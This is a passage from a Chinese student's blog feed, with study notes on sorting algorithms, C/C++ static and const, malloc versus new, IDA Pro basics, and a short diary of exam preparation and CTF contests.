<p>就是一轮下来， 边比较, 边挪位置<code>A[j + 1] = A[j]</code>, 的那满足条件的时候…把本次考察的值放到找好的这个空位置上…<br>有一个技巧叫设置<del>烧饼</del> 哨兵, 我们把A[0]作为烧饼的话, 就是A[0]一定会满足条件… 那我们上面代码中的边界状态判断<code>j &gt;= 1</code>, 就可以去掉了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(element_type A[])</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">        A[<span class="number">0</span>] = A[i];</div><div class="line">        <span class="keyword">int</span> j = i - <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span>((A[j].key &gt; A[<span class="number">0</span>].key)) &#123;</div><div class="line">            A[j + <span class="number">1</span>] = A[j];</div><div class="line">            j--;</div><div class="line">        &#125;</div><div class="line">        A[j + <span class="number">1</span>] = A[<span class="number">0</span>];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很明显，这个直接插入排序是稳定的</p>
<ol>
<li>希尔排序<br>分组的简单插入排序<br>这个排的我有点迷…不稳定排序， 但复杂度变成了<code>nlogn</code><br>每次相隔d的元素化成一组进行排序….这个d是变步长的..开始的时候 d = n/2, 每次都会有<code>d /= 2</code>…最后一次的d是1…就是所有元素都排<br>代码上来讲,,,,和普通插基本一样的感觉<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(elementtype A[])</span> </span>&#123;</div><div class="line">    d = n / <span class="number">2</span>;</div><div class="line">    <span class="keyword">while</span>(d &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = d + <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="keyword">int</span> x = A[i];</div><div class="line">            j = i - d;</div><div class="line">            <span class="keyword">while</span>((A[j].key &gt; x.key) &amp;&amp; (j &gt;= <span class="number">1</span>)) &#123;</div><div class="line">                A[j + d].key = A[j].key;</div><div class="line">                j = j - d;</div><div class="line">            &#125;</div><div class="line">            A[j + d] = x;</div><div class="line">        &#125;</div><div class="line">        d /= <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="交换类排序"><a href="#交换类排序" class="headerlink" title="交换类排序"></a>交换类排序</h3><p>思想: 两两比较交换, 一边比啊一边换</p>
<blockquote>
<p>比较插入排序的话, 插入是每次考察一个元素, 和已经有序的区域比较, 直到找到合适的位置放进去</p>
<ol>
<li>冒泡排序<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble</span><span class="params">(elementtype A[])</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++)</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = n; j &gt;= i+<span class="number">1</span>; j--)</div><div class="line">            <span class="keyword">if</span>(A[j].key &lt; A[j - <span class="number">1</span>].key)</div><div class="line">                swap(A[j], A[j - <span class="number">1</span>])</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<p>冒泡是稳定的..</p>
<ol>
<li>快排<br>快排不稳定…然后写个好看的快排</li>
</ol>
<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>在每一趟排序中, 从待选子表中选出关键字最大或者最小的元素放到最终位置上</p>
<ol>
<li>直接选择排序<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">(elementtype A[])</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</div><div class="line">        min = i;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</div><div class="line">            <span class="keyword">if</span>(A[j].key &lt; A[min].key)</div><div class="line">                min = j;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(min != i)</div><div class="line">            swap(A[min], A[i]);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>选择排序居然也是不稳定排序, emmmmm</p>
<ol>
<li><p>树形选择排序<br>看到树,首先想到复杂度肯定是比较小….<br>md， 这个操作还挺好看的…言语不是很好描述</p>
</li>
<li><p>堆排序<br>这个最难写了，我肯定不会用这个<br>堆<br>用完全二叉树实现, 父亲(i)的值比儿子(2i, 2i + 1)的值要大(小), 就对应着大(小)顶堆</p>
</li>
</ol>
<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>归并也算是…二分的结构吧<br>两两合并， 一直到合成一个…和希尔排序有点像???<br>也不太像…</p>
<p>然而归并是稳定的, 希尔是不稳定的</p>
<p>而且归并有二路归并，四路， 八路…????</p>
<h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><p>其实还感觉…这一块比较乱…我学这么多排序干啥呢</p>
]]></content>
      
        
        <tags>
            
            <tag> 复习 数据结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[static in c]]></title>
      <url>/2017/08/25/static-in-c/</url>
      <content type="html"><![CDATA[<h2 id="静态全局变量-amp-静态局部变量"><a href="#静态全局变量-amp-静态局部变量" class="headerlink" title="静态全局变量 &amp; 静态局部变量"></a>静态全局变量 &amp; 静态局部变量</h2><p>相同点就是, 静态的话, 就是放在数据段(bss or data)了, 不放在栈上边, 所以生存周期就是很长对吧</p>
<h3 id="静态全局变量"><a href="#静态全局变量" class="headerlink" title="静态全局变量"></a>静态全局变量</h3><p>全局变量就算是不静态, 也放在数据段, 对不对, 所以, 静态的全局变量这个静态要达到的效果是, <em>该变量只在本文件中可见</em>, 不能extern到其他文件里</p>
<h3 id="静态局部变量"><a href="#静态局部变量" class="headerlink" title="静态局部变量"></a>静态局部变量</h3><p>既然是局部变量, 这个静态其实就像js里函数闭包一样, 想要维持一种状态, 利用了, <em>静态变量只初始化一次</em>, 其实想一想, 我们通常说的静态就是编译时, 动态是运行时, 这里的只初始化一次, 大概就是这样子???一次性语句….<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">count</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num = <span class="number">0</span>;</div><div class="line">    num++;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, num);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="静态成员方法-amp-静态成员变量-OOP"><a href="#静态成员方法-amp-静态成员变量-OOP" class="headerlink" title="静态成员方法 &amp; 静态成员变量 (OOP)"></a>静态成员方法 &amp; 静态成员变量 (OOP)</h2><p>静态方法可以认为是, 类方法…<br>静态方法不能访问不静态的成员变量, 因为传参的时候不会把this指针传给他</p>
<p>同理, 静态成员变量可以认为是类变量, 用来存储类级别的一些内容, 比如实例个数</p>
<p>这些, 类级的变量可以直接通过类名而无需通过实例来访问</p>
<p>一个要注意的地方是, 静态成员在类内只是申明的样子,</p>
<ol>
<li>静态方法也要在类外定义</li>
<li>静态成员变量要在类外写一个定义(当然可以顺手初始化)</li>
</ol>
<blockquote>
<p>当然例外是const + static 可以在类内…忽略这个特例</p>
</blockquote>
<h2 id="静态函数-全局"><a href="#静态函数-全局" class="headerlink" title="静态函数(全局)"></a>静态函数(全局)</h2><p>这个其实就和全局静态变量是一个道理, 是为了隐藏作用域, <em>该函数只能在本文件中使用</em>, 这样子其他文件中就可以使用同名的函数了</p>
<blockquote>
<p>因为函数里不能定义函数, 所以说到函数, 肯定是全局的了哦</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> c 复习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc/free 和 new/delete]]></title>
      <url>/2017/08/25/malloc-free-%E5%92%8C-new-delete/</url>
      <content type="html"><![CDATA[<p>malloc和new应当是都在堆上分配内存, 但有一点区别</p>
<h2 id="mallloc-amp-free"><a href="#mallloc-amp-free" class="headerlink" title="mallloc &amp; free"></a>mallloc &amp; free</h2><p>从malloc工作原理来看, 就仅仅是分配一块大小合适的地方…以前笔记也有记录过, 最初是从顶块上割下来一块用, free掉后会进入fast bin, 或者其他的bin链表里, 再后来malloc的话, 根据大小, 从不同的bin上取下来, 返回的是User Data的起始地址, 不包括chunk header, 很纯粹, 只是分配空间给你, 没有初始化还是其他什么的内容</p>
<p>从语言层面来看, malloc返回的是<code>void *</code>的类型, 所以在使用的时候要强制类型转换一下</p>
<p>对了, 实际使用过程中, malloc之后应当检测一下, 结果是不是NULL, 然后再使用(我下面没写)</p>
<p>free的话就是…emmmmm, 把分出去的chunk给收回来, 放到空闲链表里…其实就是增加了<code>fd</code>, <code>bk</code>, 指针</p>
<p>我写了一个蹩脚的链表. 然后怀疑人生中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">next</span>;</span></div><div class="line">    <span class="keyword">int</span> val;</div><div class="line">&#125;Node;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Node * <span class="built_in">list</span> = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</div><div class="line">    <span class="built_in">list</span> -&gt; val = <span class="number">111</span>;</div><div class="line">    <span class="built_in">list</span> -&gt; next = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</div><div class="line">    <span class="built_in">list</span> -&gt; next -&gt; val = <span class="number">222</span>;</div><div class="line">    <span class="built_in">list</span> -&gt; next -&gt; next = <span class="literal">NULL</span>;</div><div class="line">    Node * ptr = <span class="built_in">list</span>;</div><div class="line">    <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ptr -&gt; val);</div><div class="line">        ptr = ptr -&gt; next;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"print done\n"</span>);</div><div class="line">    ptr = <span class="built_in">list</span>;</div><div class="line">    <span class="keyword">while</span>(ptr != <span class="literal">NULL</span>) &#123;</div><div class="line">        Node * temptr = ptr;</div><div class="line">        ptr = ptr -&gt; next;</div><div class="line">        <span class="built_in">free</span>(temptr);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"free done\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="new-amp-delete"><a href="#new-amp-delete" class="headerlink" title="new &amp; delete"></a>new &amp; delete</h2><p>这个其实我不太熟悉, 因为我不太会oop, 所以很少用<br>只知道new是C++的一个操作符…<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">static</span> <span class="keyword">int</span> num;</div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="keyword">int</span> a;</div><div class="line">        A() &#123;num++; <span class="built_in">puts</span>(<span class="string">"num++"</span>);&#125;</div><div class="line">        A(<span class="keyword">int</span> _a):a(_a * _a) &#123;num++; <span class="built_in">puts</span>(<span class="string">"num++"</span>);&#125;</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;<span class="built_in">printf</span>(<span class="string">"[*]%d a: %d"</span>, num, a);&#125;</div><div class="line">&#125;;</div><div class="line"><span class="keyword">int</span> A::num = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    A * a1 = <span class="keyword">new</span> A;</div><div class="line">    a1 -&gt; b();</div><div class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line"></div><div class="line">    A * a2 = <span class="keyword">new</span> A();</div><div class="line">    a2 -&gt; b();</div><div class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line"></div><div class="line">    A a3;</div><div class="line">    a3.b();</div><div class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line"></div><div class="line">    A * a4 = (A * )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(A));</div><div class="line">    a4 -&gt; b();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">num++</span></div><div class="line"><span class="comment">[*]1 a: 0</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">num++</span></div><div class="line"><span class="comment">[*]2 a: 0</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">num++</span></div><div class="line"><span class="comment">[*]3 a: 2</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">[*]3 a: 0</span></div><div class="line"><span class="comment">*/</span></div></pre></td></tr></table></figure></p>
<p>首先有个重要的问题就是, 类内的静态成员变量要在类外进行定义…不然就会出现未定义的引用..就像我这里写的那个<code>int A::num = 0</code><br>类内部写的静态成员, 相当于是只做了一个申明, 只是有了一个scope, 但要使用(存储)的话必须要在类外定义一下</p>
<blockquote>
<p>静态其实是讲与程序有着相同的生命周期…所以静态变量即便是局部的…也只是作用域在局部…但却是一直存在的, 所以也只会经历一次初始化, 从存储上讲的话, 静态变量和全局变量是一样的…未初始化的在bss, 初始化的在data</p>
</blockquote>
<p>跑题了….从上面就可以看出来的new和malloc的区别</p>
<ol>
<li>malloc返回的指针是<code>void *</code>的, 需要强制转化, 而new的话返回的就不需要了</li>
<li>malloc分配的大小需要自己定, new的话不需要</li>
<li>malloc不会调用构造函数…这个从最后一个没有<code>num++</code>可以看出来,当然简单数据类型的话new也不调用</li>
<li>new分配失败好像会触发异常, 所以不能通过是否返回NULL来判断分配成功与否</li>
</ol>
<p>所以相应的delete不光是会回收空间, 可能还会调用析构函数</p>
<p>据说是new分三个过程</p>
<ol>
<li><p>调用operator new(size), 比如 new int, 差不多汇编是这样子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">push 4</div><div class="line">call operator new(size)</div><div class="line">add esp, 4</div></pre></td></tr></table></figure>
</li>
<li><p>在分配的内存空间上, 调用构造函数(基本类型没有在这个操作)</p>
</li>
<li>转换指针类型??? (这个我也不太确定)</li>
</ol>
<p>这里看到上面四个生成类的方法, 还想讲几点</p>
<h3 id="有括号和没括号的区别"><a href="#有括号和没括号的区别" class="headerlink" title="有括号和没括号的区别"></a>有括号和没括号的区别</h3><ol>
<li><p>对于内置类型, 比如int</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> <span class="keyword">int</span> <span class="comment">// 不会初始化</span></div><div class="line"><span class="keyword">new</span> <span class="keyword">int</span>() <span class="comment">//会初始化为0</span></div></pre></td></tr></table></figure>
</li>
<li><p>对于类</p>
</li>
</ol>
<ul>
<li>没括号是默认初始化</li>
<li>有括号是值初始化</li>
</ul>
<p>结论: 我还是加括号吧, 这个我还是不太清楚</p>
<h3 id="用new和不用new的区别"><a href="#用new和不用new的区别" class="headerlink" title="用new和不用new的区别"></a>用new和不用new的区别</h3><p>new底下调用的是malloc, 是在堆上分配内存<br>不new的话…就是在栈上了呗…</p>
<p>另外, 不new的话, 也有隐和显两种写法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A a = A(<span class="number">2</span>);</div><div class="line"><span class="function">A <span class="title">a</span><span class="params">(<span class="number">2</span>)</span></span>;</div></pre></td></tr></table></figure></p>
<p>差不多就这样子了</p>
]]></content>
      
        
        <tags>
            
            <tag> c 复习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[const in c]]></title>
      <url>/2017/08/24/const-in-c/</url>
      <content type="html"><![CDATA[<p>一直不太知道const…</p>
<h2 id="指针上使用const"><a href="#指针上使用const" class="headerlink" title="指针上使用const"></a>指针上使用const</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> * <span class="keyword">const</span> p;     <span class="comment">//p的值不可变, 也就是指向不能变</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> * p;     <span class="comment">//p所指向的内容不可变, [*]常用</span></div><div class="line"><span class="keyword">char</span> <span class="keyword">const</span> * p;     <span class="comment">// 同上, p指向的内容不能变</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> p;       <span class="comment">//都不可变</span></div></pre></td></tr></table></figure>
<p>如果const在指针的左边</p>
<p>如果const在指针的右边</p>
<h2 id="const做函数形参"><a href="#const做函数形参" class="headerlink" title="const做函数形参"></a>const做函数形参</h2><p>普通形参加不加const限定符对实参没有影响，引用形参和指针形参前面没有const限定符时，实参必须是非const的<br>所以要保证的是指针所指向的内容不变…所以是<br>fun(const int * arg)<br>的形式, 注意const位置</p>
<h2 id="const成员函数"><a href="#const成员函数" class="headerlink" title="const成员函数"></a>const成员函数</h2><p>大概是这样子的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></div><div class="line">    ...</div><div class="line">    func(...arg) <span class="keyword">const</span>;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>任何..不修改成员变量的函数都应当声明为const的. 这样子的话如果试图修改成员变量, 将报错???….就像是java里@override差不多. 为了增强程序的鲁棒性</p>
<p>但, 好像实际原因是这里的const其实是把<code>this *</code>给const掉了, 在汇编层面,this指针是成员函数的第一个参数(g++), MSVC的话由于是this call, 也没啥第一个不第一个</p>
<p>原来的this指针只是指向不能变, 当给成员函数加了const修饰以后, 就是传给函数的this指针指向的对象也不能变…所以就不能修改成员变量了</p>
<h3 id="const修饰的对象"><a href="#const修饰的对象" class="headerlink" title="const修饰的对象"></a>const修饰的对象</h3><p>const修饰的对象, 不能调用非const的成员函数</p>
<h2 id="CV限定符"><a href="#CV限定符" class="headerlink" title="CV限定符"></a>CV限定符</h2><p>C(const)<br>V(volatile)</p>
<ol>
<li>在C++中，非成员函数不能含有CV限定</li>
<li>在C++中，静态成员函数不能有CV限定</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[对一段时间的记录]]></title>
      <url>/2017/08/24/%E5%AF%B9%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="2017-08-24"><a href="#2017-08-24" class="headerlink" title="2017-08-24"></a>2017-08-24</h2><h3 id="15-50"><a href="#15-50" class="headerlink" title="15:50"></a>15:50</h3><p>今天是<code>2017-08-24</code>, 昨天到了学校<br>今天早上睡到了差不多8点多, 中午睡了一个小时, 现在还有点小困<br>买了玻璃杯放在宿舍喝水<br>保研的事情还没定下来, 还是很慌, 准备这几天复习一下复试的课程<br>昨晚看了下阿里的笔试题目…准备答得时候发现辣鸡输入法又GG了…<br>所以也就是看了下<br>下午, 把手里的RE4B再看一点…这书翻译的简直了…早知道直接看gitBook了…<br>明天就把假期看完的这些书锁起来, 不动了, 然后就好好复习<br>就这样子吧, 我去看书了</p>
<h2 id="2017-08-25"><a href="#2017-08-25" class="headerlink" title="2017-08-25"></a>2017-08-25</h2><h3 id="15-22"><a href="#15-22" class="headerlink" title="15:22"></a>15:22</h3><p>发现自己链表都不会写了, 好慌啊…</p>
<h3 id="17-18"><a href="#17-18" class="headerlink" title="17:18"></a>17:18</h3><p>本来是学写链表的, 发现不会C++, 结果刚学了一下</p>
<h3 id="19-07"><a href="#19-07" class="headerlink" title="19.07"></a>19.07</h3><p>吃完饭, 休息了一下, 继续学数据结构</p>
<h2 id="2017-08-26"><a href="#2017-08-26" class="headerlink" title="2017-08-26"></a>2017-08-26</h2><p>打了一天xnuca, 这一场是web…其实就是搜索exp大赛, 毁我青春…<br>打的忘记了滴滴的内退笔试…GG…没给我发邮件啊.md醉了</p>
<h2 id="2017-08-27"><a href="#2017-08-27" class="headerlink" title="2017-08-27"></a>2017-08-27</h2><p>复习数据结构…</p>
<h2 id="2017-08-28-2017-09-08"><a href="#2017-08-28-2017-09-08" class="headerlink" title="2017-08-28 ~ 2017-09-08"></a>2017-08-28 ~ 2017-09-08</h2><p>大概十天时间…打了ISG, 不知道名次, 但据说可以去上海颁奖<br><em>粗略</em>复习了数据结构, 操作系统, 计算机网络, 概率论, 和离散的 <em>一部分</em> 内容<br>还没准备机试….马上准备, 明天是周六, 周末..有大把时间抓紧时间加油</p>
<p>今天投递一下计算所, 启明, 绿盟, 深信服 QAQ, 就当做一下笔试题<br>单元我信工所初试能过</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[hook入门]]></title>
      <url>/2017/08/14/hook%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>安卓的参考蒸米的安卓动态调试七种武器之HOOK</p>
<p>没有网好痛苦==</p>
<p>不想看了, 想睡觉</p>
]]></content>
      
        
        <tags>
            
            <tag> RE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IDA使用入门]]></title>
      <url>/2017/08/12/IDA%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>主要是记下一些快捷键?</p>
<ol>
<li>IDA View<br>空格可以切换Graph视图和正常视图<br>Graph其实很少用,所以可以在<br>Options - General - Graph里可以把<code>use graph view by default</code>勾掉</li>
</ol>
<ol>
<li>交叉引用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">some asm code   ; CODE XREF: some location</div><div class="line">some asm code   ; DATA XREF: some location</div></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>代码交叉引用</li>
<li>数据交叉引用</li>
</ul>
<ol>
<li>Hex View<br>有的时候是问号, 表示IDA无法识别给定虚拟地址范围内的值<br>如果包含bss的话, 就会这样子…</li>
</ol>
<p>明天早起继续看</p>
<ol>
<li><p>跳转<br>G 跳转到…<br>Esc 后退</p>
</li>
<li><p>重命名<br>N</p>
</li>
<li><p>举了一个cdecl不需要清理参数的例子<br>正常情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">; demo_call(1, 2, 3, 4)</div><div class="line">push 4</div><div class="line">push 3</div><div class="line">push 2</div><div class="line">push 1</div><div class="line">call demo_call</div><div class="line">add  esp, 16    ; 调用者清理参数</div></pre></td></tr></table></figure>
</li>
</ol>
<p>有的时候, 没有采用push的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">; demo_call(1, 2, 3, 4)</div><div class="line">mov [esp+12], 4</div><div class="line">mov [esp+8], 3</div><div class="line">mov [esp+4], 2</div><div class="line">mov [esp], 1</div><div class="line">call demo_call</div><div class="line">; 不需要调用方清理参数</div></pre></td></tr></table></figure></p>
<ol>
<li><p>搜索<br>ALT + T 文本搜索<br>ALT + B 二进制搜索</p>
</li>
<li><p>代码数据互换<br>U(undefine)  取消定义 code变成原始一个一个byte</p>
</li>
</ol>
<p>C(code)     <code>data -&gt; code</code><br>D(data)     <code>code -&gt; data</code> 在数据转盘里切换data种类</p>
<p>数据转盘里设置 <code>options -&gt; Steup data types</code></p>
<ol>
<li><p>数据相关<br>db 1字节    byte<br>dw 2字节    word<br>dd 4字节    dword<br>dq 8字节    qword</p>
</li>
<li><p>数组<br>选中数据开头, <code>Edit -&gt; Array</code>,可以创建数组<br>这样子关于数组的访问就是基于<code>Array_head + offset</code>的形式</p>
</li>
<li><p>结构体<br>结构体, 几乎没法直接分辨是用了结构体<br>要自己手动识别, 然后添加</p>
</li>
</ol>
<h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><p>C++ 果然复杂的…毛线一样</p>
<ol>
<li><p>this<br>所有非静态C++成员函数都是用this指针<br>把this看做是传递到所有非静态成员函数的第一个隐含参数<br>MS VC++ 遵循thiscall, 把this传入到ECX寄存器<br>GUN g++ 把this看成最左边的参数,最后压入栈</p>
</li>
<li><p>虚函数 虚表<br><code>包含虚函数的类</code>的第一个数据成员是一个指针,叫做虚表指针(vtable pointer), 指向他的虚表<br>虚表是一个包含类中<code>指向每一个虚函数的指针</code>的表</p>
</li>
</ol>
